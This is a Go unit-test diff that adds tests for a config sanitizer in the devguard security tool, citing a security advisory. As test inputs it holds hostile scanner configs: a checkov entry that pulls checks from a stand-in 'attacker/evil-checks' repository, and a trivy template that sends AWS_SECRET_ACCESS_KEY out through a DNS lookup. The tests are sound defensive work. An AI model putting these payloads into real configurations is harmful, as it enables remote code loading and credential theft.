@@ -230,3 +230,106 @@ func TestSetXAssetHeaders(t *testing.T) {
 		assert.Equal(t, "0", req.Header.Get("X-Tag"))
 	})
 }
+
+// Ref: https://github.com/l3montree-dev/devguard/security/advisories/GHSA-pr5r-qq8m-ppjq
+func TestSanitizeConfig(t *testing.T) {
+	t.Run("removes external-checks-git from a checkov config", func(t *testing.T) {
+		input := `
+skip-check:
+  - CKV_AWS_20
+external-checks-git:
+  - https://github.com/attacker/evil-checks
+`
+		got := sanitizeConfig(".checkov.yml", input)
+
+		assert.NotContains(t, got, "external-checks-git")
+		assert.Contains(t, got, "CKV_AWS_20")
+	})
+
+	t.Run("removes external-checks-git under the checkov-config.yaml filename too", func(t *testing.T) {
+		input := `external-checks-git: https://github.com/attacker/evil-checks`
+		got := sanitizeConfig("checkov-config.yaml", input)
+
+		assert.NotContains(t, got, "external-checks-git")
+	})
+
+	t.Run("removes a nested external-checks-git property", func(t *testing.T) {
+		input := `
+compact: true
+nested:
+  external-checks-git: https://github.com/attacker/evil-checks
+  keep-me: true
+`
+		got := sanitizeConfig(".checkov.yml", input)
+
+		assert.NotContains(t, got, "external-checks-git")
+		assert.Contains(t, got, "keep-me")
+	})
+
+	t.Run("does not touch an unrelated checkov property", func(t *testing.T) {
+		input := `
+skip-check:
+  - CKV_AWS_20
+framework:
+  - terraform
+`
+		got := sanitizeConfig(".checkov.yml", input)
+
+		assert.Contains(t, got, "CKV_AWS_20")
+		assert.Contains(t, got, "terraform")
+	})
+
+	t.Run("removes template from a trivy config", func(t *testing.T) {
+		input := `
+format: template
+template: '{{ getHostByName (env "AWS_SECRET_ACCESS_KEY") }}'
+severity: CRITICAL
+`
+		got := sanitizeConfig("trivy.yaml", input)
+
+		assert.NotContains(t, got, "getHostByName")
+		assert.Contains(t, got, "CRITICAL")
+	})
+
+	t.Run("does not strip template-like text from an unrelated scanner config", func(t *testing.T) {
+		input := `
+rules:
+  - id: template-injection-check
+    languages: [go]
+`
+		got := sanitizeConfig(".semgrep.yaml", input)
+
+		assert.Equal(t, input, got)
+	})
+
+	t.Run("passes gitleaks config through unchanged", func(t *testing.T) {
+		input := `
+title = "gitleaks config"
+
+[[rules]]
+id = "aws-key"
+`
+		got := sanitizeConfig("gitleaks.toml", input)
+
+		assert.Equal(t, input, got)
+	})
+
+	t.Run("passes through unknown config filenames unchanged", func(t *testing.T) {
+		input := `external-checks-git: https://github.com/attacker/evil-checks`
+		got := sanitizeConfig("some-other-file.yaml", input)
+
+		assert.Equal(t, input, got)
+	})
+
+	t.Run("does not choke on invalid yaml, returns original content", func(t *testing.T) {
+		input := `not: valid: yaml: at: all: {[`
+		got := sanitizeConfig(".checkov.yml", input)
+
+		assert.Equal(t, input, got)
+	})
+
+	t.Run("does not choke on empty content", func(t *testing.T) {
+		got := sanitizeConfig(".checkov.yml", "")
+		assert.Equal(t, "", got)
+	})
+}
